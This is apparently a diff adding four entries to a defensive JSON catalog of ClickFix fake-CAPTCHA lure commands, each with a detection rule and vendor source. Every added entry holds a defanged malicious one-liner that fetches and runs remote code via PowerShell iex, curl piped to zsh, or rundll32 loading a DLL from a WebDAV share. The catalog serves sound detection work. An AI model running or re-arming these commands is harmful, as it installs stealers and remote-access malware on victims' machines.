@@ -3,7 +3,7 @@
     "title": "ClickFix Command Catalog",
     "purpose": "Defensive threat-intel reference of ClickFix (fake-CAPTCHA / paste-and-run) command patterns for detection engineering and threat hunting.",
     "warning": "All commands are DEFANGED malicious samples for DETECTION ONLY. Do not execute. URLs neutralised (hxxp, [.]).",
-    "updated": "2026-08-14"
+    "updated": "2026-08-18"
   },
   "entries": [
     {
@@ -174,6 +174,46 @@
       "detection": "Alert on pushd to a \\\\host@SSL\\DavWWWRoot UNC path and rundll32 loading a DLL with a non-.dll extension from a WebClient/WebDAV-mounted drive",
       "source": "Microsoft Threat Intelligence",
       "source_url": "hxxps://www[.]microsoft[.]com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/",
+      "date_added": "2026-07-16"
+    },
+    {
+      "id": "cf-0018",
+      "command": "powershell -c \"iex(irm '151.240.151[.]126/rRlmZcaaZfAE3U2BaH' -UseBasicParsing)\"",
+      "executor": "powershell.exe",
+      "technique": "Fake Google/Cloudflare 'verify you are human' page poisons clipboard with an irm|iex one-liner that pulls a stager from a bare-IPv4 host (StealC/ResiLoader)",
+      "detection": "powershell.exe running Invoke-RestMethod/irm against a raw IPv4 URL with -UseBasicParsing and piping to iex, with no browser-trusted parent process",
+      "source": "Malwarebytes Threat Intelligence",
+      "source_url": "hxxps://www.malwarebytes[.]com/blog/threat-intel/2026/07/fake-google-and-cloudflare-verification-pages-spread-multiple-malware-families",
+      "date_added": "2026-07-02"
+    },
+    {
+      "id": "cf-0019",
+      "command": "curl -kfsSL $(echo '<base64>'|base64 -D)|zsh",
+      "executor": "zsh",
+      "technique": "macOS 'Google Meet audio fix' ClickFix lure; a base64-encoded URL is decoded inline and the fetched script is piped straight into zsh",
+      "detection": "Terminal/zsh spawning curl with a command-substituted 'base64 -D' URL piped to a shell; hunt shell history for 'base64 -D' feeding curl|zsh",
+      "source": "Malwarebytes Threat Intelligence",
+      "source_url": "hxxps://www.malwarebytes[.]com/blog/threat-intel/2026/07/fake-google-and-cloudflare-verification-pages-spread-multiple-malware-families",
+      "date_added": "2026-07-02"
+    },
+    {
+      "id": "cf-0020",
+      "command": "powershell IEX ((Invoke-RestMethod -Uri hxxps://pharmacynod[.]com/Fix -Method GET).note.body)",
+      "executor": "powershell.exe",
+      "technique": "ClickFix one-liner retrieves JSON from a /Fix endpoint and executes the nested '.note.body' property to launch a multi-stage PowerShell-to-RAT chain",
+      "detection": "powershell using Invoke-RestMethod where a response object property (e.g. .note.body / .body) is passed directly to IEX",
+      "source": "Fortinet FortiGuard Labs",
+      "source_url": "hxxps://www.fortinet[.]com/blog/threat-research/clickfix-to-command-a-full-powershell-attack-chain",
+      "date_added": "2025-08-11"
+    },
+    {
+      "id": "cf-0021",
+      "command": "\"C:\\Windows\\system32\\rundll32.exe\" \\\\sphere-api.dialectosphere[.]in@ssl\\05fe317c-0981-4de2-bc8a-930d369db441\\ck-3d80df5d12cdfe6450a782fc87bf66b444.google,#1",
+      "executor": "rundll32.exe",
+      "technique": "ClickFix loads a DLL from an @SSL WebDAV share, disguised with a '.google' extension and invoked by ordinal '#1' (ACR Stealer WebDAV chain)",
+      "detection": "rundll32.exe loading a UNC path containing '@ssl' with a non-.dll file extension and an ordinal export (e.g. ',#1')",
+      "source": "Microsoft Defender Experts / Red Canary (via The Hacker News)",
+      "source_url": "hxxps://www.microsoft[.]com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/",
       "date_added": "2026-07-16"
     }
   ]
